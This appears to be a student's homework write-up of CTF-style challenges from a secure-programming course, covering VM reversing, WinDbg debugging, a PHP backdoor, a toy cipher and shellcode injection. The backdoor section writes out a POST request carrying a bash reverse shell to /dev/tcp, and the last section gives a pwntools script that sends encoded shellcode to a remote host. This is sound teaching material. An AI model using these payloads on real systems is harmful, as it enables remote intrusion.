# SecureProgramming

# Secure Programming Hw0 

## Q1 M4chine	
### Reverse the oboriginal program
- First,we only got a .pyc file which is a binary file of python.
Using tool "uncompyle6" decompiled the source to python code.

- After getting the source code,I found the python code seems written by python3 version.

- But it can't be run correctly at first because of some data type error when using 
function emu.e_start.The parameter in the function is str type at first after decompiled,and its data type should be corrected to bytecode.	

```
#initially
#emu.e_start('\x08\x00\x07\x08\x00\x00\x01d\

#after corrected
emu.e_start(''\x08\x00\x07\x08\x00\x00\x01d\
```

- After corrected,I found the program asking user to input some string,and the program would run a series of operation according to our input.
Observing the source code and running result,I know the the bytecode in the function.
emu.e_start representing the operation below:
```
\x00 \x00 add:
Remove the last two characters of the context,and append a new character to the context which ascii code is the sum of the two removed characters.
ex.
str_i = "012" \x30\x31\x32
#after add operation
str_i = "0c"  \x30\x63


\x01 \x(aa) cmp:
Compare the bytecode of the last characters in the context and the 
following bytecode '\xaa',if the bytecode of last character in input string and the bytecode '\xaa' is the same.The last character will be removed and append a 
bytecode \x01 to the last character in the string,otherwise it would be set to \x00.

\x03 \x00 emty:
If the len of the current context is zero,returning true.
Otherwise,returning false.

\x06\x00 pop:
Remove the last character of the context.

\x07\xaa push:
append the bytecode \xaa to the context.

\x08\x00 sub:
Remove the last two characters of the context,and append a new character to the context which ascii code is the the result of the context[-1]-context[-2]

\t\x00(aka \x09\x00) terminal:
If the bytecode of the last character in context is zero,terminate the operation in the function emu.e_start and print "you fail..." message.
```

- Thouhts of solving the problem

  - After observing the operations in emu.e_start function,the operation between every terminal operation seems to influence only last one character in the context.
  - Because we already knowed the format of the flag is 'Flag{......}' , we know the last character and first five characters of the correct input.

  - So I decided to bruforce the flag by chaging the last character of context which the correct one will run the most bytecodes(because it will pass the terminal operation and go next).

  - By setting a counter to record the length of running bytecodes,we append the character to the tail of context which then bruforce the next correct character.Below is my source code.
```python=
#/usr/bin/env python3
from ctypes import *
from binascii import *

class Machine:

    def __init__(self, init):
        #self.t_flag = 0
        self.run_numlen = 0
        self.context = list(map(ord, init))
        self.op = {0:self.add,  1:self.cmp,  2:self.context,  3:self.empty,  6:self.pop,  7:self.push,  8:self.sub,  9:self.terminal}
    
    def empty(self, _):
        return len(self.context) == 0

    def e_start(self, code):
        #ls_num = -100
        self.t_flag = 0
        
        for i in zip(*(iter(code),) * 2):
            #self.run_numlen = self.run_numlen + 1   
            if i != None:
                if self.t_flag == 1:
                    break
                else: 
                    self.op[i[0]](i[1])
                    self.run_numlen = self.run_numlen + 1

    def push(self, num):
        self.context.append(num)

    def pop(self, _):
        if len(self.context) < 1:
            raise SyntaxError('You should sharpen your coding skill')
        result, self.context = self.context[(-1)], self.context[:-1]
        return result

    def terminal(self, _):
        if len(self.context) < 1:
            raise SyntaxError('You should sharpen your coding skill')
        if self.context[(-1)] == 0:
            #print(self.context)
            #print('You fail, try again') 
            self.t_flag = 1

    def add(self, _):
        if len(self.context) < 2:
            print('error occur in ' + str(run_len_f) + " bytecode:")
            print('occur context:')
            print(self.context)
            exit(0)
            #raise SyntaxError('You should sharpen your coding skill')
        result, self.context = self.context[(-1)] + self.context[(-2)], self.context[:-2]
        self.context.append(c_int8(result).value)

    def sub(self, _):
        if len(self.context) < 2:
            raise SyntaxError('You should sharpen your coding skill')
        result, self.context = self.context[(-1)] - self.context[(-2)], self.context[:-2]
        self.context.append(c_int8(result).value)

    def cmp(self, num):
        if len(self.context) < 1:
            raise SyntaxError('You should sharpen your coding skill') 
        if self.context[(-1)] == num:
            self.context[-1] = 1
        else:
            #print("last digit is " + str(num))
            self.context[-1] = 0

s_head = "FLAG{"
'''
payload = ""
run_len_f = 0
s_tail = "}"

while run_len_f < 130:
    for i in range(94):
    #s = "FLAG{" + chr(i+33)+"}"  #out ! runlen 8
    #s = "FLAG{" + chr(i+33)+"!}"  #out 3 runlen 21
    #...............................................
    #............................................... 
    #s = "FLAG{" + chr(i+33)+"0w_BiiiiiiiiG_SiZe3e3!}"
        #print(run_len_f)
        emu = Machine(s_head + chr(i+33) + s_tail)
        emu.e_start(b'\x08\x00\x07\x08\x00\x00\x01d\t\x00\x00\x00\x014\t\x00\x073\x07\x01\x073\x08\x00\x00\x00\x01e\t\x00\x00\x00\x08\x00\x07c\x00\x00\x01\x00\t\x00\x00\x00\x074\x08\x00\x01\x00\t\x00\x06\x00\x01e\t\x00\x06\x00\x07Z\x08\x00\x01\x00\t\x00\x07h\x00\x00\x08\x00\x01\x00\t\x00\x06\x00\x07S\x08\x00\x01\x00\t\x00\x06\x00\x07_\x08\x00\x01\x00\t\x00\x06\x00\x07G\x08\x00\x01\x00\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01C\t\x00\x06\x00\x07\x00\x07\x01\x00\x00\x07\x02\x00\x00\x07\x03\x00\x00\x07\x04\x00\x00\x07\x05\x00\x00\x07\x06\x00\x00\x07\x07\x00\x00\x07\x08\x00\x00\x07\t\x00\x00\x07\n\x00\x00\x07\x0b\x00\x00\x07\x0c\x00\x00\x07\r\x00\x00\x07\x04\x00\x00\x08\x00\x01\x00\t\x00\x06\x00\x01w\t\x00\x06\x00\x010\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x13\x00\x00\x01\x00\t\x00')
        ##130 op code totally
        if run_len_f< emu.run_numlen:
            run_len_f = emu.run_numlen
            payload = chr(i+33)
            s_tail = payload + s_tail
'''
''' error occur after 120 byte code at add operation, the input is 
    FLAG{ w_BiiiiiiiiG_SiZe3e3!}
    the final byte code is -106,at byte before operation code position 120,the program execute the cmp 0(char) first so we set the Flag to
    FLAG{ + next char + w_BiiiiiiiiG_SiZe3e3!} and bruforce again
'''

s_tail = "0w_BiiiiiiiiG_SiZe3e3!}"
run_len_f = 120
while run_len_f <= 129:
    for i in range(94):
        step2_emu = Machine(s_head + chr(i+33) + s_tail)
        step2_emu.e_start(b'\x08\x00\x07\x08\x00\x00\x01d\t\x00\x00\x00\x014\t\x00\x073\x07\x01\x073\x08\x00\x00\x00\x01e\t\x00\x00\x00\x08\x00\x07c\x00\x00\x01\x00\t\x00\x00\x00\x074\x08\x00\x01\x00\t\x00\x06\x00\x01e\t\x00\x06\x00\x07Z\x08\x00\x01\x00\t\x00\x07h\x00\x00\x08\x00\x01\x00\t\x00\x06\x00\x07S\x08\x00\x01\x00\t\x00\x06\x00\x07_\x08\x00\x01\x00\t\x00\x06\x00\x07G\x08\x00\x01\x00\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01j\t\x00\x00\x00\x01C\t\x00\x06\x00\x07\x00\x07\x01\x00\x00\x07\x02\x00\x00\x07\x03\x00\x00\x07\x04\x00\x00\x07\x05\x00\x00\x07\x06\x00\x00\x07\x07\x00\x00\x07\x08\x00\x00\x07\t\x00\x00\x07\n\x00\x00\x07\x0b\x00\x00\x07\x0c\x00\x00\x07\r\x00\x00\x07\x04\x00\x00\x08\x00\x01\x00\t\x00\x06\x00\x01w\t\x00\x06\x00\x010\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x13\x00\x00\x01\x00\t\x00')

        if run_len_f< step2_emu.run_numlen and step2_emu.t_flag==0:
                run_len_f = step2_emu.run_numlen
                payload = chr(i+33)
                s_tail = payload + s_tail

print(s_head + s_tail)
```
flag:FLAG{W0w_BiiiiiiiiG_SiZe3e3!}
## Winmagic
- Using Windbg open the executable file and loading the pdb file with command: 
.sympath　srv*　https://msdl.microsoft.com/download/symbols;D:\pdbpath\Winmagic.pdb
reload /f
The pdb file must be renamed as Winmagic which the same as the module name in executable file.
- After reading the source code,we can get flag only when we enter the same password which is generated randomly. So I set a breakpoint at 
00007ff6`37621f84(address)
mov     dword ptr [rsp+60h],eax
using command 'bp 00007ff6`37621f84'.
Checking the eax register value we can know what password we should input.
flag:FLAG{WinDbg_is_very_important_in_windows_security}

## Open my backd00r
- Analyze the source code below:
```
<?php
set_time_limit(3);
ini_set('max_execution_time', 3);
highlight_file(__FILE__);$f=file(__FILE__);

$c=chr(substr_count($f[1],chr(32)));
$x=(substr($_GET[87],0,4)^"d00r");$x(${"_\x50\x4f\x53\x54"}{$c});
```
We know $f is the current webpage source itself.

The varable $c is a character which ascii code is the count of the 'space' in the second section(section split by tag '< /br>') of page.We could use ctrl+u to check it. 
In source code the space is '&nbsp' and There are 35 &nbsp totally,so the $c represent a character '#'.

The variable $x is a xor result of the string "d00r" and get request parameter 87's value.
So if we request the web page like ```http://webpage?87=%01%48%55%11```
The result of $x would be "exec".

The last line of code represent that the php will execute the command $x which parameter is the paramter $c value of _POST.

Combined all of it,we construct a request with burpsuite,we finally got a reverse shell.
```
POST /d00r.php?87=%01HU%11 HTTP/1.1
Host: edu-ctf.csie.org:10151
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 65
Content-Type: application/x-www-form-urlencoded

%23=bash+-i+%3E%26+%2Fdev%2Ftcp%2Fip_addr%2F4444+0%3E%261
```
![](https://i.imgur.com/TM50pPd.png)
flag:FLAG{do_u_like_my_d0000000r?}

## Encrypt

- In the resource I downloaded,I have the encrypted cipher and the source which encrypt the original flag file.
- After analyzing the source code,I found all random functions are actually generating certain values.
- The uncertain factor in source code is only the key which used to encrypt the original flag,but the possibility of the key only differs from 0 to 255,vulnerable to be bruforced.
- After reversing every functions which used to encrypt the flag,we used loop to list all flags which encrpyed by different keys,below is my exploit code:
```=python3
#!/usr/bin/env python3
from sympy import *
import random

def op1(p, s):
    return sum([i * j for i, j in zip(s, p)]) % 256

def op2(m, k):
    return bytes([i ^ j for i, j in zip(m, k)])

def op3(m, p):
    return bytes([m[p[i]] for i in range(len(m))])

def op4(m, s):
    return bytes([s[x] for x in m])

'''
Linear Feedback Shift Register
'''
def dec_op2(c):
    k = [239, 194, 15, 76, 81, 87, 59, 247, 160, 19, 227, 201, 119, 125, 116, 166]
    return bytes([i ^ j for i,j in zip(c,k)])

def dec_op3(c):
    rev_p = [14, 13, 0, 10, 15, 3, 6, 4, 2, 9, 11, 1, 5, 7, 8, 12]
    return bytes([c[rev_p[i]] for i in range(len(c))])

def dec_op4(c):
    rev_s = [141, 154, 50, 242, 39, 72, 47, 160, 147, 196, 235, 67, 146, 149, 155, 4, 208, 193, 42, 101, 32, 70, 224, 210, 244, 109, 29, 197, 199, 86, 73, 49, 60, 126, 79, 153, 69, 182, 140, 143, 44, 115, 144, 194, 27, 51, 84, 98, 206, 249, 202, 227, 43, 234, 158, 176, 64, 184, 28, 156, 157, 201, 219, 12, 94, 172, 46, 85, 41, 198, 78, 30, 34, 91, 134, 11, 6, 58, 10, 129, 254, 190, 255, 130, 239, 103, 222, 16, 142, 108, 161, 127, 111, 192, 171, 92, 62, 107, 122, 200, 131, 228, 56, 33, 229, 237, 105, 188, 54, 37, 75, 185, 102, 168, 52, 164, 81, 20, 99, 124, 175, 128, 252, 178, 18, 191, 116, 118, 151, 159, 40, 53, 253, 90, 212, 205, 7, 17, 148, 21, 22, 117, 113, 48, 221, 77, 179, 15, 181, 120, 76, 240, 220, 133, 166, 135, 88, 110, 216, 104, 25, 225, 80, 38, 9, 217, 63, 114, 211, 183, 245, 26, 203, 247, 87, 218, 139, 209, 123, 1, 95, 83, 163, 19, 100, 223, 177, 162, 226, 65, 0, 167, 14, 248, 187, 93, 236, 180, 246, 61, 232, 23, 214, 125, 13, 215, 233, 204, 89, 150, 165, 132, 169, 24, 250, 82, 3, 59, 66, 137, 35, 138, 241, 119, 96, 213, 74, 45, 231, 112, 186, 136, 57, 55, 238, 170, 145, 8, 230, 106, 5, 97, 2, 71, 121, 174, 36, 31, 195, 173, 68, 152, 243, 207, 189, 251]
    return bytes([rev_s[x] for x in c])
'''
decrypt op 
'''
def stage0(m):
    random.seed('oalieno')
    p = [int(random.random() * 256) for i in range(16)]
    #[52, 216, 195, 20, 247, 160, 98, 181, 14, 34, 159, 85, 235, 192, 7, 106]
    s = [int(random.random() * 256) for i in range(16)]
    #[101, 230, 217, 70, 242, 16, 138, 87, 193, 207, 81, 22, 116, 232, 68, 165]
    c = b''
    k = op1(p, s) 
    for x in m:
        k = op1(p, s) #142,97,45,175,112,157,238,137,114,214,34,143,72,175,56,100
        c += bytes([x ^ k])
        s = s[1:] + [k]
    return c

#When executing stag0,the flags xor with byte_arr=[142,97,45,175,112,157,238,137,114,214,34,143,72,175,56,100]
#to decode,xor byte_arr with cipher
'''
Substitution Permutation Network
'''

def dec_stage0(c):
    plain_text=b''
    byte_arr=[142,97,45,175,112,157,238,137,114,214,34,143,72,175,56,100]
    i = 0
    for x in c:
        plain_text += bytes([x^byte_arr[i]])
        i = i + 1
    return plain_text


def stage1(m):
    random.seed('oalieno')
    k = [int(random.random() * 256) for i in range(16)]
    #k=[239, 194, 15, 76, 81, 87, 59, 247, 160, 19, 227, 201, 119, 125, 116, 166]
    p = [i for i in range(16)]
    random.shuffle(p)
    #p = [2, 11, 8, 5, 7, 12, 6, 13, 14, 9, 3, 10, 15, 1, 0, 4]
    
    s = [i for i in range(256)]
    random.shuffle(s)
    #s = [190, 179, 242, 216, 15, 240, 76, 136, 237, 164, 78, 75, 63, 204, 192, 147, 87, 137, 124, 183, 117, 139, 140, 201, 213, 160, 171, 44, 58, 26, 71, 247, 20, 103, 72, 220, 246, 109, 163, 4, 130, 68, 18, 52, 40, 227, 66, 6, 143, 31, 2, 45, 114, 131, 108, 233, 102, 232, 77, 217, 32, 199, 96, 166, 56, 189, 218, 11, 250, 36, 21, 243, 5, 30, 226, 110, 150, 145, 70, 34, 162, 116, 215, 181, 46, 67, 29, 174, 156, 208, 133, 73, 95, 195, 64, 180, 224, 241, 47, 118, 184, 19, 112, 85, 159, 106, 239, 97, 89, 25, 157, 92, 229, 142, 167, 41, 126, 141, 127, 223, 149, 244, 98, 178, 119, 203, 33, 91, 121, 79, 83, 100, 211, 153, 74, 155, 231, 219, 221, 176, 38, 0, 88, 39, 42, 236, 12, 8, 138, 13, 209, 128, 251, 35, 1, 14, 59, 60, 54, 129, 7, 90, 187, 182, 115, 210, 154, 191, 113, 212, 235, 94, 65, 249, 245, 120, 55, 186, 123, 146, 197, 148, 37, 169, 57, 111, 230, 194, 107, 254, 81, 125, 93, 17, 43, 248, 9, 27, 69, 28, 99, 61, 50, 172, 207, 135, 48, 253, 16, 177, 23, 168, 134, 225, 202, 205, 158, 165, 175, 62, 152, 144, 86, 185, 22, 161, 188, 51, 101, 104, 238, 228, 200, 206, 53, 10, 196, 105, 234, 84, 151, 222, 3, 252, 24, 170, 198, 173, 193, 49, 214, 255, 122, 132, 80, 82]
    c = m
    for i in range(16):
        c = op2(c, k)
        c = op3(c, p)
        c = op4(c, s)

    return c

def dec_stage1(c):
    for i in range(16):
        c = dec_op4(c)
        c = dec_op3(c)
        c = dec_op2(c)
    return c

def encrypt(m, key):
    stage = [stage0, stage1]

    #for i in map(int, f'{key:08b}'):
     #   m = stage[i](m)
    return m

def decrypt(c,ke):
    dec_stage = [dec_stage0,dec_stage1]
    for i in ke:
        c = dec_stage[i](c)
    return c

def bitfield(n):
        s = [int(digit) for digit in bin(n)[2:]] # [2:] to chop off the "0b" part
        for i in range(8-len(s)):
            s.insert(0,0)
        return s

if __name__ == '__main__':
    #flag = open('flag', 'rb').read()
    cip_f = open('cipher','rb').read()
    for i in range(256):
        ke = bitfield(i)
        p = decrypt(cip_f,ke)
        print(p)
```
flag:FLAG{q6B3KviyaM}

## shellc0de

- Analyzing the source code,I know the process on the system will execute the shell code I sent only when there are no bad characters '\x00\x05\x0f'.
- Using pwntool's module shellcraft,I generated a shellcode without badcharacters,and finally got the flag.
- Below is my exploit code:
```
from pwn import *

host = 'edu-ctf.csie.org'
port = 10150

r = remote(host,port)

context.arch = 'amd64'

r.recvuntil('>')

shellcode = asm(shellcraft.sh())

avoid = '\x00\x05\x0f'

encode_shell = encoders.encode(shellcode,avoid)

r.sendline(encode_shell)
r.interactive()
```
![](https://i.imgur.com/tmnPfYr.png)
